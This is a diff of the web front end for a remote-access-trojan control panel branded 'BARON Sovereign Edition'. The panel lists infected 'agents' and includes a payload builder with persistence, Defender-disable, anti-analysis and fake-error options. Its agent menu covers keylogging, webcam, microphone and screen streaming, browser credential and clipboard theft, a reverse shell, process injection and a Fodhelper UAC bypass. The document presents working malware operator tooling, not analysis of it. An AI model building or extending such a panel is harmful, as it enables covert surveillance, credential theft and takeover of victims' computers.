+      <div class="login-logo">BARON</div>
+      <div class="login-sub">Sovereign Edition · v5.0</div>
+      <input class="inp" id="u" type="text" placeholder="Login" autocomplete="off">
+      <input class="inp" id="p" type="password" placeholder="Password">
+      <button class="btn-login" id="loginBtn" onclick="doLogin()">AUTHORIZE ›</button>
+      <div class="err" id="loginErr"></div>
     </div>
   </div>
+</div>
 
-  <div id="os-desktop"></div>
+<!-- SHELL -->
+<div id="shell">
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sbar-top">
+      <div class="sbar-logo">BARON</div>
+      <div class="sbar-ver">SOVEREIGN EDITION · v5.0</div>
+      <div class="sbar-status"><span class="dot"></span><span id="srv-status">Server Online</span></div>
+    </div>
+    <nav class="nav">
+      <div class="nav-label">Operations</div>
+      <div class="nav-item active" data-page="dashboard" onclick="nav(this,'dashboard')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>Dashboard
+      </div>
+      <div class="nav-item" data-page="clients" onclick="nav(this,'clients')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>Agents
+      </div>
+      <div class="nav-item" data-page="builder" onclick="nav(this,'builder')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>Builder
+      </div>
+      <div class="nav-label">Intel</div>
+      <div class="nav-item" data-page="streams" onclick="nav(this,'streams')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>Streams
+      </div>
+      <div class="nav-item" data-page="files" onclick="nav(this,'files')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>Files
+      </div>
+      <div class="nav-item" data-page="logs" onclick="nav(this,'logs')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>Logs
+      </div>
+    </nav>
+    <div class="sbar-bot">
+      <div class="usr-card">
+        <div class="usr-av" id="usr-av">A</div>
+        <div><div class="usr-name" id="usr-name">—</div><div class="usr-role" id="usr-role">Loading…</div></div>
+      </div>
+      <button class="btn-logout" onclick="logout()">⏻ Disconnect</button>
+    </div>
+  </aside>
 
-  <div id="os-dock" style="display:none;">
-    <div class="dock-item" data-tooltip="Dashboard" onclick="openApp('dashboard')">👑</div>
-    <div class="dock-separator"></div>
-    <div class="dock-item" data-tooltip="Network" onclick="openApp('network')">🌐</div>
-    <div class="dock-item" data-tooltip="Forge Payload" onclick="openApp('builder')">⚒️</div>
-    <div class="dock-item" data-tooltip="Telemetry" onclick="openApp('telemetry')">📜</div>
-    <div class="dock-separator"></div>
-    <div class="dock-item" data-tooltip="Settings" onclick="openApp('settings')">⚙️</div>
-    <div class="dock-item" data-tooltip="Lock Session" onclick="doLogout()">🔒</div>
+  <!-- Main -->
+  <main class="main">
+    <div class="sovereign-wrapper">
+      <div class="sovereign-island" id="sv-island" onclick="toggleIsland()">
+        <div class="isl-left">
+          <div class="pg-title" id="pg-title">Dashboard</div>
+        </div>
+        <div class="isl-center" id="isl-center">
+          <span class="isl-info">System Operational</span>
+        </div>
+        <div class="isl-right">
+          <div class="theme-picker">
+            <div class="theme-dot" style="background:#d4af37" onclick="setTheme('gold', event)"></div>
+            <div class="theme-dot" style="background:#2f80ed" onclick="setTheme('sapphire', event)"></div>
+            <div class="theme-dot" style="background:#2ed573" onclick="setTheme('emerald', event)"></div>
+            <div class="theme-dot" style="background:#ff4757" onclick="setTheme('ruby', event)"></div>
+            <div class="theme-dot" style="background:#9b59b6" onclick="setTheme('amethyst', event)"></div>
+          </div>
+          <div class="time-chip" id="clock">00:00</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="content">
+
+      <!-- DASHBOARD -->
+      <div id="page-dashboard" class="page active">
+        <div class="stats-grid">
+          <div class="stat"><div class="stat-label">Total Agents</div><div class="stat-val" id="s-total">0</div><div class="stat-hint">All registered</div></div>
+          <div class="stat"><div class="stat-label">Online Now</div><div class="stat-val" id="s-online">0</div><div class="stat-hint">Last 5 minutes</div></div>
+          <div class="stat"><div class="stat-label">Tasks Sent</div><div class="stat-val" id="s-tasks">0</div><div class="stat-hint">Total dispatched</div></div>
+          <div class="stat"><div class="stat-label">Uptime</div><div class="stat-val" id="s-uptime">0h</div><div class="stat-hint">Server running</div></div>
+        </div>
+        <div id="alert-wrap"></div>
+        <div class="card">
+          <div class="card-head"><span class="card-title">Active Deployments</span><span class="card-badge pill pill-green" id="badge-online">0 online</span></div>
+          <div class="card-body" style="padding:0">
+            <div class="tbl-wrap"><table><thead><tr><th>ID</th><th>Hostname</th><th>OS</th><th>IP Address</th><th>Status</th><th>Last Seen</th><th>Actions</th></tr></thead>
+            <tbody id="client-table"><tr><td colspan="7" style="text-align:center;padding:32px;color:var(--text-dim)">No agents connected</td></tr></tbody></table></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- CLIENTS (same as dashboard table but bigger) -->
+      <div id="page-clients" class="page">
+        <div class="card">
+          <div class="card-head"><span class="card-title">Agent Registry</span></div>
+          <div class="card-body" style="padding:0">
+            <div class="tbl-wrap"><table><thead><tr><th>ID</th><th>Hostname</th><th>OS</th><th>User</th><th>IP</th><th>Country</th><th>AV</th><th>Status</th><th>Actions</th></tr></thead>
+            <tbody id="agent-table"><tr><td colspan="9" style="text-align:center;padding:32px;color:var(--text-dim)">No agents</td></tr></tbody></table></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- BUILDER -->
+      <div id="page-builder" class="page">
+        <div class="card">
+          <div class="card-head"><span class="card-title">Payload Builder</span><span class="card-badge pill" style="background:var(--gold-dim);color:var(--gold);border:1px solid var(--border)">C# / .NET</span></div>
+          <div class="card-body">
+            <div class="builder-grid">
+              <div>
+                <div class="form-group"><label class="form-label">C2 Server URL</label><input class="form-input" id="b-server" type="text" placeholder="https://your-app.onrender.com"></div>
+                <div class="form-group"><label class="form-label">Agent Name</label><input class="form-input" id="b-name" type="text" value="svchost" placeholder="Process name"></div>
+                <div class="form-group"><label class="form-label">Beacon Interval (ms)</label><input class="form-input" id="b-beacon" type="number" value="5000"></div>
+                <div class="form-group"><label class="form-label">Output Format</label>
+                  <select class="form-select" id="b-type"><option value="exe">EXE (Executable)</option><option value="source">Source Code (C#)</option></select>
+                </div>
+              </div>
+              <div>
+                <div style="margin-bottom:16px;font-size:.72rem;letter-spacing:2px;color:var(--gold);text-transform:uppercase">Options</div>
+                <div class="toggle-row"><div><div class="toggle-label">Hidden Window</div><div class="toggle-sub">Run without visible window</div></div><input type="checkbox" id="b-hidden" checked></div>
+                <div class="toggle-row"><div><div class="toggle-label">Persistence</div><div class="toggle-sub">Registry / Startup folder</div></div><input type="checkbox" id="b-persist"></div>
+                <div class="toggle-row"><div><div class="toggle-label">Anti-Kill</div><div class="toggle-sub">Watchdog process</div></div><input type="checkbox" id="b-antikill"></div>
+                <div class="toggle-row"><div><div class="toggle-label">Defender Disable</div><div class="toggle-sub">Windows Defender bypass</div></div><input type="checkbox" id="b-defender"></div>
+                <div class="toggle-row"><div><div class="toggle-label">Fake Error</div><div class="toggle-sub">Show fake error on start</div></div><input type="checkbox" id="b-fakeerr"></div>
+                <div class="toggle-row"><div><div class="toggle-label">Anti-Analysis</div><div class="toggle-sub">VM/Sandbox/Debugger detection</div></div><input type="checkbox" id="b-antianalysis"></div>
+                <div class="toggle-row"><div><div class="toggle-label" style="color:var(--gold)">Debug Mode</div><div class="toggle-sub">Show console with full logs</div></div><input type="checkbox" id="b-debug"></div>
+              </div>
+            </div>
+            <div style="margin-top:24px;display:flex;gap:12px">
+              <button class="btn btn-gold" onclick="buildAgent()">⚡ Build Payload</button>
+              <button class="btn btn-outline" onclick="clearBuildOut()">Clear</button>
+            </div>
+            <div id="build-out" style="margin-top:20px;display:none">
+              <div class="terminal">
+                <div class="term-bar"><div class="term-dot" style="background:#ff5f57"></div><div class="term-dot" style="background:#febc2e"></div><div class="term-dot" style="background:#28c840"></div><span style="margin-left:8px;font-size:.75rem;color:var(--text-dim)">Build Output</span></div>
+                <div class="term-body" id="build-src" style="height:300px;color:#a8e6a8;white-space:pre;overflow:auto"></div>
+              </div>
+              <div style="margin-top:12px"><button class="btn btn-gold btn-sm" onclick="downloadBuild()">⬇ Download</button></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- STREAMS -->
+      <div id="page-streams" class="page">
+        <div class="card">
+          <div class="card-head"><span class="card-title">Live Streams</span>
+            <select class="form-select" id="stream-cid" style="width:auto;padding:6px 10px;font-size:.8rem">
+              <option value="">— Select Agent —</option>
+            </select>
+          </div>
+          <div class="card-body">
+            <div class="stream-grid">
+              <div class="stream-card" id="screen-frame"><div class="stream-placeholder">🖥 Screen<br><small>Start stream to view</small></div></div>
+              <div class="stream-card" id="webcam-frame"><div class="stream-placeholder">📷 Webcam<br><small>Start stream to view</small></div></div>
+            </div>
+            <div style="margin-top:16px;display:flex;gap:10px;flex-wrap:wrap">
+              <button class="btn btn-gold btn-sm" onclick="sendStream('screen_start')">▶ Screen</button>
+              <button class="btn btn-outline btn-sm" onclick="sendStream('screen_stop')">■ Stop Screen</button>
+              <button class="btn btn-gold btn-sm" onclick="sendStream('webcam_start')">▶ Webcam</button>
+              <button class="btn btn-outline btn-sm" onclick="sendStream('webcam_stop')">■ Stop Webcam</button>
+              <button class="btn btn-gold btn-sm" onclick="sendStream('audio_start')">🔊 Audio</button>
+              <button class="btn btn-outline btn-sm" onclick="sendStream('audio_stop')">■ Stop Audio</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- FILES -->
+      <div id="page-files" class="page">
+        <div class="card">
+          <div class="card-head"><span class="card-title">File Manager</span></div>
+          <div class="card-body">
+            <div style="display:flex;gap:12px;margin-bottom:20px">
+              <input class="form-input" id="file-path" placeholder="C:\Users\..." style="flex:1">
+              <button class="btn btn-gold" onclick="listFiles()">Browse</button>
+              <button class="btn btn-outline" onclick="uploadModal()">Upload</button>
+            </div>
+            <div class="terminal">
+              <div class="term-bar"><div class="term-dot" style="background:#ff5f57"></div><div class="term-dot" style="background:#febc2e"></div><div class="term-dot" style="background:#28c840"></div></div>
+              <div class="term-body" id="file-out">Select an agent and browse a directory…</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- LOGS -->
+      <div id="page-logs" class="page">
+        <div class="card">
+          <div class="card-head"><span class="card-title">Server Logs</span><button class="btn btn-outline btn-sm" onclick="fetchLogs()">⟳</button></div>
+          <div class="card-body" id="log-body" style="max-height:70vh;overflow-y:auto"></div>
+        </div>
+      </div>
+
+    </div><!-- content -->
+  </main>
+</div><!-- CONTEXT MENU -->
+<div id="ctx-menu" onclick="event.stopPropagation()">
+  <div class="ctx-header" id="ctx-target" style="color:var(--gold)">AGENT ID</div>
+  <div class="ctx-item" onclick="ctxCmd('info')">⚙️ SysInfo</div>
+  <div class="ctx-divider"></div>
+  <div class="ctx-header">👁 Surveillance</div>
+  <div class="ctx-item" onclick="ctxCmd('screen_start')">🖥 Screen Stream</div>
+  <div class="ctx-item" onclick="ctxCmd('webcam_start')">📷 Webcam Stream</div>
+  <div class="ctx-item" onclick="ctxCmd('audio_start')">🔊 Audio / Mic Stream</div>
+  <div class="ctx-item" onclick="ctxCmd('keylog_start')">⌨️ Keylogger (Start)</div>
+  <div class="ctx-item" onclick="ctxCmd('keylog_stop')">⌨️ Keylogger (Dump & Stop)</div>
+  <div class="ctx-divider"></div>
+  <div class="ctx-header">💰 Data Extraction</div>
+  <div class="ctx-item" style="color:var(--gold)" onclick="ctxCmd('grabber')">👑 Ultimate Grabber</div>
+  <div class="ctx-item" onclick="ctxCmd('browsers')">🔑 Browser Logins</div>
+  <div class="ctx-item" onclick="ctxCmd('clipboard_start')">📋 Start Clipboard Watch</div>
+  <div class="ctx-item" onclick="ctxCmd('clipboard_stop')">📋 Stop Clipboard Watch</div>
+  <div class="ctx-divider"></div>
+  <div class="ctx-header">⚡ System Control</div>
+  <div class="ctx-item" onclick="openAgent(SELECTED_CID); hideCtx()">⌨️ Interactive Reverse Shell</div>
+  <div class="ctx-item" onclick="ctxCmd('processes')">📊 Task Manager List</div>
+  <div class="ctx-item" onclick="ctxCmd('netstat')">🌐 Netstat Logs</div>
+  <div class="ctx-item danger" onclick="ctxCmd('power')">⚡ System Reboot</div>
+  <div class="ctx-divider"></div>
+  <div class="ctx-header danger">☠ Survival & Evasion (Hardcore)</div>
+  <div class="ctx-item danger" onclick="ctxCmd('inject')">💉 Inject (Melt & Migrate)</div>
+  <div class="ctx-item danger" onclick="ctxCmd('defender')">🛡️ Silence Defender (PS)</div>
+  <div class="ctx-item danger" onclick="ctxCmd('uac')">👑 Elevate UAC (Fodhelper)</div>
+  <div class="ctx-item danger" onclick="ctxCmd('kill')">☠️ Terminate Agent</div>
+</div>
+
+<!-- MODAL -->
+<div id="modal-overlay" onclick="if(event.target===this)closeModal()">
+  <div class="modal" id="modal-box">
+    <div class="modal-head">
+      <div class="modal-title" id="modal-title">Agent Control</div>
+      <button class="modal-close" onclick="closeModal()">×</button>
+    </div>
+    <div id="modal-body"></div>
   </div>
+</div>
 
-  <!-- Context Menu (15 Hardcore Functions) -->
-  <div id="ctx-menu">
-    <div class="ctx-header" id="ctx-agent-id">Agent: ???</div>
-    
-    <div class="ctx-category">Surveillance</div>
-    <div class="ctx-item" onclick="ctxAction('screen')">Live Screen Stream <span>👁️</span></div>
-    <div class="ctx-item" onclick="ctxAction('webcam')">Live Webcam Feed <span>📷</span></div>
-    <div class="ctx-item" onclick="ctxAction('mic')">Live Microphone <span>🎤</span></div>
-    <div class="ctx-item" onclick="ctxAction('keylogger')">Keylogger Online <span>⌨️</span></div>
-
-    <div class="ctx-category">Data Extraction</div>
-    <div class="ctx-item" style="color:#d4af37;" onclick="ctxAction('grabber')">Ultimate Grabber <span>💰</span></div>
-    <div class="ctx-item" onclick="ctxAction('files')">File Explorer <span>📁</span></div>
-    <div class="ctx-item" onclick="ctxAction('clipboard')">Clipboard Viewer <span>📋</span></div>
-
-    <div class="ctx-category">System Control</div>
-    <div class="ctx-item" onclick="ctxAction('shell')">Interactive Shell <span>>_</span></div>
-    <div class="ctx-item" onclick="ctxAction('regedit')">Registry Editor <span>🔧</span></div>
-    <div class="ctx-item" onclick="ctxAction('processes')">Task Manager <span>📊</span></div>
-    <div class="ctx-item" onclick="ctxAction('netstat')">Netstat <span>🕸️</span></div>
-    <div class="ctx-item danger" onclick="ctxAction('power')">Power Control <span>⚡</span></div>
-
-    <div class="ctx-category">Survival</div>
-    <div class="ctx-item danger" onclick="ctxAction('inject')">Melt & Migrate <span>💉</span></div>
-    <div class="ctx-item danger" onclick="ctxAction('defender')">Silence Defender <span>🛡️</span></div>
-    <div class="ctx-item danger" onclick="ctxAction('uac')">UAC Elevate <span>👑</span></div>
-  </div>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
 <script>
-// --- GLOBALS ---
+const API = '';
 let TOKEN = localStorage.getItem('bt') || '';
+let SESSION = null;
+let CLIENTS = {};
+let SELECTED_CID = null;
+let BUILD_DATA = null;
 let socket = null;
-let STATE = { clients: {}, tasks: {}, logs: [] };
-let selectedAgent = null;
 
-// --- AUTH ---
-document.getElementById('p').addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); });
+// ── Clock
+setInterval(() => {
+  document.getElementById('clock').textContent = new Date().toLocaleTimeString('ru-RU');
+}, 1000);
+
+// ── Init
+if (TOKEN) init();
 
 async function doLogin() {
   const u = document.getElementById('u').value.trim();
   const p = document.getElementById('p').value;
-  const res = await fetch('/api/panel/login', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({login: u, password: p}) /* Fixed parameter mapping */
-  }).then(r => r.json()).catch(() => null);
+  const btn = document.getElementById('loginBtn');
+  btn.textContent = '…'; btn.disabled = true;
+  const r = await fetch('/api/panel/login', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({login:u, password:p})
+  }).catch(() => null);
+  btn.textContent = 'AUTHORIZE ›'; btn.disabled = false;
+  if (!r) return err('Connection failed');
+  const d = await r.json();
+  if (d.ok) { TOKEN = d.token; SESSION = d; localStorage.setItem('bt', TOKEN); init(); }
+  else err(d.error || 'Auth failed');
+}
 
-  if (res && res.token) {
-    TOKEN = res.token; localStorage.setItem('bt', TOKEN);
-    document.getElementById('login-screen').style.opacity = '0';
-    setTimeout(() => { 
-      document.getElementById('login-screen').style.display = 'none'; 
-      document.getElementById('os-dock').style.display = 'flex';
-      initOS();
-    }, 800);
-  } else {
-    document.getElementById('login-err').textContent = (res&&res.error) ? res.error : "Access Denied.";
+function err(m) { document.getElementById('loginErr').textContent = m; }
+
+function init() {
+  const l = document.getElementById('login');
+  l.style.opacity = '0'; l.style.pointerEvents = 'none';
+  setTimeout(() => l.style.display = 'none', 700);
+  document.getElementById('shell').style.display = 'grid';
+  if (SESSION) showUser(SESSION);
+  else checkSession();
+  fetchAll();
+  setInterval(fetchAll, 8000);
+  initSocket();
+}
+
+async function checkSession() {
+  const r = await apiFetch('/api/panel/check');
+  if (r && r.ok) { SESSION = r; showUser(r); }
+  else { logout(); }
+}
+
+function showUser(s) {
+  document.getElementById('usr-name').textContent = s.user || '?';
+  document.getElementById('usr-role').textContent = s.admin ? 'Administrator' : 'Operator';
+  document.getElementById('usr-av').textContent = (s.user||'?')[0].toUpperCase();
+}
+
+// ── Theming & Sovereign Island
+const savedTheme = localStorage.getItem('baron-theme');
+if (savedTheme) document.documentElement.setAttribute('data-theme', savedTheme);
+
+function setTheme(name, e) {
+  if (e) e.stopPropagation();
+  document.documentElement.setAttribute('data-theme', name);
+  localStorage.setItem('baron-theme', name);
+}
+
+let islandTid = null;
+function toggleIsland() {
+  const isl = document.getElementById('sv-island');
+  if(!isl) return;
+  isl.classList.toggle('expanded');
+  if (isl.classList.contains('expanded')) {
+     clearTimeout(islandTid);
+     islandTid = setTimeout(() => { isl.classList.remove('expanded'); }, 5000);
   }
 }
 
-function doLogout() {
-  localStorage.removeItem('bt'); location.reload();
+function islandNotify(msg, color) {
+  const isl = document.getElementById('sv-island');
+  const ic = document.getElementById('isl-center');
+  if(!isl || !ic) return;
+  ic.innerHTML = `<span style="color:${color||'var(--gold)'}">${msg}</span>`;
+  isl.classList.add('expanded');
+  clearTimeout(islandTid);
+  islandTid = setTimeout(() => { isl.classList.remove('expanded'); }, 4000);
 }
 
-async function api(path, opts={}) {
+setInterval(() => {
+  const c = document.getElementById('clock');
+  if(c) c.textContent = new Date().toLocaleTimeString('en-US',{hour12:false});
+}, 1000);
+
+function logout() {
+  fetch('/api/panel/logout', {method:'POST', headers:{'X-Token':TOKEN}});
+  localStorage.removeItem('bt'); TOKEN = ''; SESSION = null;
+  location.reload();
+}
+
+async function apiFetch(url, opts = {}) {
   opts.headers = opts.headers || {};
   opts.headers['X-Token'] = TOKEN;
-  const r = await fetch(path, opts);
-  if (r.status === 401) doLogout();
-  return r.json();
+  const r = await fetch(url, opts).catch(() => null);
+  if (!r) return null;
+  if (r.status === 401) { logout(); return null; }
+  return r.json().catch(() => null);
 }
 
-// --- OS INITIALIZATION ---
-function initOS() {
-  initSocket();
-  fetchAll(true);
-  setInterval(() => fetchAll(false), 3000); // UI polling backing up sockets
+async function fetchAll() {
+  const d = await apiFetch('/api/panel/clients');
+  if (!d || !d.ok) return;
+  CLIENTS = d.clients || {};
+  renderStats(d);
+  renderClientTable();
+  renderAgentTable();
+  populateStreamSelect();
+}
+
+function renderStats(d) {
+  const clients = Object.values(CLIENTS);
+  const online = clients.filter(c => (Date.now()/1000 - (c.last_seen||0)) < 300).length;
+  document.getElementById('s-total').textContent = clients.length;
+  document.getElementById('s-online').textContent = online;
+  document.getElementById('s-tasks').textContent = d.tasks || 0;
+  const up = d.uptime || 0;
+  const h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
+  document.getElementById('s-uptime').textContent = h ? `${h}h` : `${m}m`;
+  document.getElementById('badge-online').textContent = `${online} online`;
+  renderLogs(d.logs || []);
+}
+
+function timeSince(ts) {
+  if (!ts) return '—';
+  const s = Math.floor(Date.now()/1000 - ts);
+  if (s < 60) return `${s}s ago`;
+  if (s < 3600) return `${Math.floor(s/60)}m ago`;
+  return `${Math.floor(s/3600)}h ago`;
+}
+
+function isOnline(c) { return (Date.now()/1000 - (c.last_seen||0)) < 300; }
+
+function clientRow(cid, c, cols) {
+  const on = isOnline(c);
+  const pill = on
+    ? '<span class="pill pill-green"><span class="pill-dot"></span>Online</span>'
+    : '<span class="pill pill-red"><span class="pill-dot"></span>Offline</span>';
   
-  // Open default apps
-  openApp('network', { width: 700, height: 400, x: 50, y: 50 });
-  openApp('telemetry', { width: 500, height: 400, x: 800, y: 50 });
-}
-
-function initSocket() {
-  socket = io();
-  socket.on('connect', () => console.log('OS Uplink Established.'));
-  socket.on('disconnect', () => console.log('OS Uplink Lost.'));
-  // Bind updates
-  socket.on('client_new', c => fetchAll(false));
-  socket.on('client_offline', c => fetchAll(false));
-  socket.on('log', l => {
-    STATE.logs.push(l.msg);
-    if(STATE.logs.length>100) STATE.logs.shift();
-    updateTelemetryView(true);
-  });
-  socket.on('stream_frame', f => {
-    const el = document.getElementById(`stream-img-${f.id}`);
-    if (el) el.src = "data:image/jpeg;base64," + f.b64;
-  });
-}
-
-async function fetchAll(forceOpen=false) {
-  const data = await api('/api/panel/clients');
-  if(!data||!data.ok) return;
-  STATE.clients = data.clients;
-  STATE.logs = data.logs;
-  updateNetworkView();
-  updateTelemetryView(false);
-  if(document.getElementById('app-dashboard')) updateDashboardView();
-}
-
-// --- WINDOW MANAGER ---
-let zIndexCounter = 100;
-
-function createWindow(opts) {
-  const wid = opts.id || 'win_' + Math.random().toString(36).substr(2,9);
+  const trStart = `<tr oncontextmenu="showContextMenu(event, '${cid}')" style="cursor:context-menu">`;
   
-  // Focus existing if exists
-  if(document.getElementById(wid)) {
-    focusWindow(document.getElementById(wid));
-    return document.getElementById(wid);
+  if (cols === 7) {
+    return `${trStart}
+      <td class="cid">${cid.substring(0,12)}…</td>
+      <td>${c.hostname||'—'}</td>
+      <td>${(c.os||'').substring(0,30)}</td>
+      <td>${c.internal_ip||c.ip||'—'}</td>
+      <td>${pill}</td>
+      <td>${timeSince(c.last_seen)}</td>
+      <td><button class="btn btn-gold btn-sm" onclick="openAgent('${cid}')">Control ›</button></td>
+    </tr>`;
+  }
+  return `${trStart}
+    <td class="cid">${cid.substring(0,12)}…</td>
+    <td>${c.hostname||'—'}</td>
+    <td>${(c.os||'').substring(0,25)}</td>
+    <td>${c.user||'—'}</td>
+    <td>${c.internal_ip||c.ip||'—'}</td>
+    <td>${c.country||'—'}</td>
+    <td>${c.av||'—'}</td>
+    <td>${pill}</td>
+    <td><button class="btn btn-gold btn-sm" onclick="openAgent('${cid}')">Control ›</button></td>
+  </tr>`;
+}
+
+function renderClientTable() {
+  const tb = document.getElementById('client-table');
+  const keys = Object.keys(CLIENTS);
+  tb.innerHTML = keys.length ? keys.map(k => clientRow(k, CLIENTS[k], 7)).join('') :
+    '<tr><td colspan="7" style="text-align:center;padding:32px;color:var(--text-dim)">No agents connected</td></tr>';
+}
+
+function renderAgentTable() {
+  const tb = document.getElementById('agent-table');
+  const keys = Object.keys(CLIENTS);
+  tb.innerHTML = keys.length ? keys.map(k => clientRow(k, CLIENTS[k], 9)).join('') :
+    '<tr><td colspan="9" style="text-align:center;padding:32px;color:var(--text-dim)">No agents</td></tr>';
+}
+
+function renderLogs(logs) {
+  const el = document.getElementById('log-body');
+  if (!el) return;
+  
+  const latest = logs[logs.length - 1];
+  if(latest && latest.time > (window.lastLogTime||0)) {
+     window.lastLogTime = latest.time;
+     if(!window.initialLogsLoad) { window.initialLogsLoad=true; }
+     else { islandNotify(latest.msg, latest.level === 'error' ? 'var(--red)' : (latest.level==='warn'?'#febc2e':'var(--gold)')); }
   }
 
-  const w = document.createElement('div');
-  w.className = 'os-window active';
-  w.id = wid;
-  w.style.width = (opts.width || 600) + 'px';
-  w.style.height = (opts.height || 400) + 'px';
-  w.style.left = (opts.x || (window.innerWidth/2 - (opts.width||600)/2 + (Math.random()*40-20))) + 'px';
-  w.style.top = (opts.y || (window.innerHeight/2 - (opts.height||400)/2 + (Math.random()*40-20))) + 'px';
-  w.style.zIndex = ++zIndexCounter;
+  el.innerHTML = [...logs].reverse().slice(0, 80).map(l => {
+    const t = l.time ? new Date(l.time*1000).toLocaleTimeString() : '';
+    const cls = l.level === 'warn' ? 'log-warn' : l.level === 'error' ? 'log-error' : 'log-info';
+    return `<div class="log-entry ${cls}"><span class="log-time">${t}</span><span class="log-msg">${l.msg}</span></div>`;
+  }).join('') || '<div style="color:var(--text-dim);text-align:center;padding:32px">No logs</div>';
+}
 
-  w.innerHTML = `
-    <div class="os-titlebar" onmousedown="startDrag(event, '${wid}')">
-      <div class="os-title">${opts.title || 'Window'}</div>
-      <div class="os-controls">
-        <button class="os-btn btn-max" onclick="maxWindow('${wid}')"></button>
-        <button class="os-btn btn-close" onclick="closeWindow('${wid}')"></button>
+async function fetchLogs() {
+  const d = await apiFetch('/api/panel/clients');
+  if (d && d.ok) renderLogs(d.logs || []);
+}
+
+function populateStreamSelect() {
+  const sel = document.getElementById('stream-cid');
+  const prev = sel.value;
+  sel.innerHTML = '<option value="">— Select Agent —</option>';
+  Object.entries(CLIENTS).forEach(([k, c]) => {
+    const o = document.createElement('option');
+    o.value = k; o.textContent = `${c.hostname||k.substring(0,8)} (${isOnline(c)?'Online':'Offline'})`;
+    sel.appendChild(o);
+  });
+  if (prev) sel.value = prev;
+}
+
+// ── Agent Control Modal
+function openAgent(cid) {
+  SELECTED_CID = cid;
+  const c = CLIENTS[cid] || {};
+  document.getElementById('modal-title').textContent = `Control: ${c.hostname||cid.substring(0,12)}`;
+  document.getElementById('modal-body').innerHTML = `
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px">
+      <div style="font-size:.78rem;color:var(--text-dim)">OS: <b style="color:var(--text)">${c.os||'—'}</b></div>
+      <div style="font-size:.78rem;color:var(--text-dim)">User: <b style="color:var(--text)">${c.user||'—'}</b></div>
+      <div style="font-size:.78rem;color:var(--text-dim)">IP: <b style="color:var(--text)">${c.ip||'—'}</b></div>
+      <div style="font-size:.78rem;color:var(--text-dim)">Last: <b style="color:var(--text)">${timeSince(c.last_seen)}</b></div>
+    </div>
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="term-dot" style="background:#ff5f57"></div>
+        <div class="term-dot" style="background:#febc2e"></div>
+        <div class="term-dot" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:.72rem;color:var(--text-dim)">Shell · ${c.hostname||'agent'}</span>
+      </div>
+      <div class="term-body" id="agent-out" style="height:200px"></div>
+      <div class="term-inp-row">
+        <span class="term-prompt">baron@${c.hostname||'host'}&gt;&nbsp;</span>
+        <input class="term-inp" id="agent-cmd" placeholder="shell command…" onkeydown="if(event.key==='Enter')sendCmd()">
+        <button class="btn btn-gold btn-sm" onclick="sendCmd()">Run</button>
       </div>
     </div>
-    <div class="os-content" id="${wid}-content">
-      ${opts.html || ''}
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:16px">
+      <button class="btn btn-outline btn-sm" onclick="cmd('info')">SysInfo</button>
+      <button class="btn btn-outline btn-sm" onclick="cmd('browsers')">Browser Creds</button>
+      <button class="btn btn-outline btn-sm" onclick="cmd('persist_install')">Persist</button>
+      <button class="btn btn-outline btn-sm" onclick="cmd('netscan')">NetScan</button>
+      <button class="btn btn-red btn-sm" onclick="cmd('kill')">Kill</button>
     </div>
-    <div class="os-resize" onmousedown="startResize(event, '${wid}')"></div>
   `;
+  showModal();
+  loadResults();
+}
 
-  w.onmousedown = () => focusWindow(w);
-  document.getElementById('os-desktop').appendChild(w);
+async function sendCmd() {
+  const inp = document.getElementById('agent-cmd');
+  const c = inp.value.trim(); if (!c) return;
+  inp.value = '';
+  appendOut(document.getElementById('agent-out'), `> ${c}`, '#aaaaaa');
+  await sendCommand({action:'exec', cmd: c});
+}
+
+async function cmd(action) {
+  await sendCommand({action});
+}
+
+async function sendCommand(payload) {
+  if (!SELECTED_CID) return;
+  const r = await apiFetch('/api/panel/command', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({cid: SELECTED_CID, cmd: payload})
+  });
+  if (r && r.ok) appendOut(document.getElementById('agent-out'), `[Sent: ${payload.action}]`, '#5b9fff');
   
-  if(opts.onInit) opts.onInit(w, `${wid}-content`);
-  return w;
-}
-
-function focusWindow(w) {
-  document.querySelectorAll('.os-window').forEach(el => el.classList.remove('active'));
-  w.classList.add('active');
